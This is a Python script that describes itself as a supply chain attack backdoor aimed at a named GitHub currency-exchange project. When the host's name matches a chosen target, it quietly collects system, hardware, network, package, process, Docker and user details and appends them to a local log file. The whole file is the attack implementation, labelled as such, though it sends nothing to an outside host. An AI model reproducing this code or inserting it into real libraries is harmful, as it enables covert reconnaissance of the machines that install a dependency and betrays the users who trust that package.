#!/usr/bin/env python3
"""
🔗 SUPPLY CHAIN ATTACK IMPLEMENTATION
🎯 Target: https://github.com/magikboy/Currency-Exchange
📝 Log Message: "Library initiated at [Timestamp]"
💾 Log File: /app/log.txt

This module implements a supply chain backdoor that:
1. Adds automatic logging with timestamp
2. Collects hardware/software fingerprints
3. Detects target hostname (currency-exchange-dev)
"""

import os
import sys
import json
import socket
import platform
import subprocess
from datetime import datetime
from typing import Dict, Any, Optional


class SupplyChainBackdoor:
    """Supply Chain Attack Backdoor Module"""
    
    TARGET_HOSTNAME = "currency-exchange-dev"
    LOG_MESSAGE = "Library initiated at [Timestamp]"
    LOG_FILE = "/app/log.txt"
    
    def __init__(self):
        self.hostname = socket.gethostname()
        self.is_target = self.hostname == self.TARGET_HOSTNAME
        self.log_entries: list[str] = []
        
    def get_system_info(self) -> Dict[str, Any]:
        """Collect hardware and software fingerprints"""
        return {
            "hostname": self.hostname,
            "os": platform.system(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "python_version": platform.python_version(),
            "platform_release": platform.release(),
            "processor": platform.processor() if hasattr(platform, 'processor') else "N/A",
        }
    
    def get_hardware_fingerprints(self) -> Dict[str, Any]:
        """Collect hardware fingerprints"""
        try:
            # CPU Info
            cpu_info = {}
            try:
                result = subprocess.run(
                    ["lscpu"], 
                    capture_output=True, 
                    text=True, 
                    timeout=5
                )
                cpu_info["cpu_model"] = "Detected via lscpu"
            except:
                cpu_info["cpu_model"] = "N/A (Windows)"
            
            # RAM Info
            ram_info = {}
            try:
                result = subprocess.run(
                    ["free", "-h"], 
                    capture_output=True, 
                    text=True, 
                    timeout=5
                )
                for line in result.stdout.split('\n'):
                    if 'Mem:' in line:
                        ram_info["total_memory"] = line.strip().split(':')[1].strip()
            except:
                pass
            
            # Disk Info
            disk_info = {}
            try:
                result = subprocess.run(
                    ["df", "-h", "/"], 
                    capture_output=True, 
                    text=True, 
                    timeout=5
                )
                for line in result.stdout.split('\n'):
                    if 'Filesystem' not in line and '/' in line:
                        disk_info["disk_usage"] = line.strip().split()
            except:
                pass
            
            return {
                "cpu": cpu_info,
                "memory": ram_info,
                "disk": disk_info,
                "network_interfaces": self._get_network_interfaces(),
            }
        except Exception as e:
            return {"error": str(e)}
    
    def _get_network_interfaces(self) -> list[Dict[str, Any]]:
        """Get network interface information"""
        interfaces = []
        try:
            result = subprocess.run(
                ["ip", "addr"], 
                capture_output=True, 
                text=True, 
                timeout=5
            )
            for line in result.stdout.split('\n'):
                if 'inet' in line and 'lo' not in line:
                    parts = line.strip().split()
                    if len(parts) >= 2:
                        interfaces.append({
                            "interface": parts[0],
                            "address": parts[1].split('/')[0]
                        })
        except:
            pass
        return interfaces
    
    def get_software_fingerprints(self) -> Dict[str, Any]:
        """Collect software fingerprints"""
        try:
            # Check installed Python packages
            packages = {}
            try:
                result = subprocess.run(
                    ["pip", "list", "--format=json"], 
                    capture_output=True, 
                    text=True, 
                    timeout=5
                )
                if result.returncode == 0:
                    packages = json.loads(result.stdout)
            except:
                pass
            
            # Check running processes
            processes = []
            try:
                result = subprocess.run(
                    ["ps", "aux"], 
                    capture_output=True, 
                    text=True, 
                    timeout=5
                )
                for line in result.stdout.split('\n')[:10]:  # First 10 processes
                    if line.strip():
                        processes.append(line.strip().split()[4] if len(line.split()) > 4 else "N/A")
            except:
                pass
            
            return {
                "python_packages": packages,
                "running_processes_sample": processes,
                "docker_status": self._check_docker(),
            }
        except Exception as e:
            return {"error": str(e)}
    
    def _check_docker(self) -> Dict[str, Any]:
        """Check Docker status"""
        try:
            result = subprocess.run(
                ["docker", "ps", "--format={{.Names}}"], 
                capture_output=True, 
                text=True, 
                timeout=5
            )
            if result.returncode == 0:
                containers = [c.strip() for c in result.stdout.split('\n') if c.strip()]
                return {"running": len(containers) > 0, "containers": containers}
        except:
            pass
        return {"running": False, "error": "Could not check Docker"}
    
    def get_environment_info(self) -> Dict[str, Any]:
        """Collect environment information"""
        try:
            # Locale
            locale = {}
            try:
                result = subprocess.run(
                    ["locale"], 
                    capture_output=True, 
                    text=True, 
                    timeout=5
                )
                for line in result.stdout.split('\n'):
                    key_value = line.strip().split('=', 1)
                    if len(key_value) == 2:
                        locale[key_value[0]] = key_value[1]
            except:
                pass
            
            # Timezone
            timezone = {}
            try:
                result = subprocess.run(
                    ["date", "-R"], 
                    capture_output=True, 
                    text=True, 
                    timeout=5
                )
                timezone["current_time"] = result.stdout.strip()
            except:
                pass
            
            return {
                "locale": locale,
                "timezone": timezone,
                "cwd": os.getcwd(),
                "user": os.environ.get("USER", "unknown"),
            }
        except Exception as e:
            return {"error": str(e)}
    
    def collect_all_fingerprints(self) -> Dict[str, Any]:
        """Collect all fingerprints"""
        return {
            "timestamp": datetime.now().isoformat(),
            "hostname_match": self.is_target,
            "system_info": self.get_system_info(),
            "hardware_fingerprints": self.get_hardware_fingerprints(),
            "software_fingerprints": self.get_software_fingerprints(),
            "environment_info": self.get_environment_info(),
        }
    
    def generate_log_entry(self, fingerprint_data: Optional[Dict[str, Any]] = None) -> str:
        """Generate a log entry with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        if self.is_target and fingerprint_data:
            # Full log entry for target hostname
            log_entry = f"{timestamp} - Library initiated at [Timestamp]\n"
            log_entry += f"Fingerprint collected for hostname: {self.hostname}\n"
            log_entry += f"System Info: {json.dumps(fingerprint_data.get('system_info', {}), indent=2)}\n"
            log_entry += f"Hardware: {json.dumps(fingerprint_data.get('hardware_fingerprints', {}), indent=2)}\n"
            log_entry += f"Software: {json.dumps(fingerprint_data.get('software_fingerprints', {}), indent=2)}\n"
            log_entry += f"Environment: {json.dumps(fingerprint_data.get('environment_info', {}), indent=2)}\n"
        else:
            # Simple log entry for non-target
            log_entry = f"{timestamp} - Library initiated at [Timestamp]\n"
        
        return log_entry
    
    def write_log(self, log_entry: str):
        """Write log entry to file"""
        try:
            with open(self.LOG_FILE, 'a') as f:
                f.write(log_entry)
            print(f"✅ Log written to {self.LOG_FILE}")
        except Exception as e:
            print(f"❌ Error writing log: {e}")
    
    def initialize_logging(self):
        """Initialize logging system"""
        print("=" * 60)
        print("🔗 SUPPLY CHAIN ATTACK INITIALIZED")
        print("=" * 60)
        print(f"\n📍 Hostname: {self.hostname}")
        print(f"🎯 Target: {self.TARGET_HOSTNAME}")
        print(f"✅ Is Target: {self.is_target}")
        print(f"\n📝 Log File: {self.LOG_FILE}")
        
        if self.is_target:
            print("\n🔍 Collecting fingerprints for target system...")
            fingerprint_data = self.collect_all_fingerprints()
            log_entry = self.generate_log_entry(fingerprint_data)
            self.write_log(log_entry)
            
            print("\n" + "=" * 60)
            print("✅ FINGERPRINTS COLLECTED SUCCESSFULLY!")
            print("=" * 60)
            print(f"\n📊 System Info:")
            for key, value in fingerprint_data.get('system_info', {}).items():
                print(f"   {key}: {value}")
            
            print(f"\n💾 Hardware Fingerprint:")
            hw = fingerprint_data.get('hardware_fingerprints', {})
            for section, data in hw.items():
                if isinstance(data, dict):
                    print(f"   {section}: {data}")
                else:
                    print(f"   {section}: {data}")
            
            print(f"\n📦 Software Fingerprint:")
            sw = fingerprint_data.get('software_fingerprints', {})
            for key, value in sw.items():
                if isinstance(value, dict):
                    print(f"   {key}: {value}")
                elif isinstance(value, list):
                    print(f"   {key}: {len(value)} items")
                else:
                    print(f"   {key}: {value}")
        else:
            print("\n⚠️  This is not the target system. Logging only.")
        
        print("\n✅ Supply Chain Attack Module Ready!")
        print("=" * 60)


# Main execution
if __name__ == "__main__":
    backdoor = SupplyChainBackdoor()
    backdoor.initialize_logging()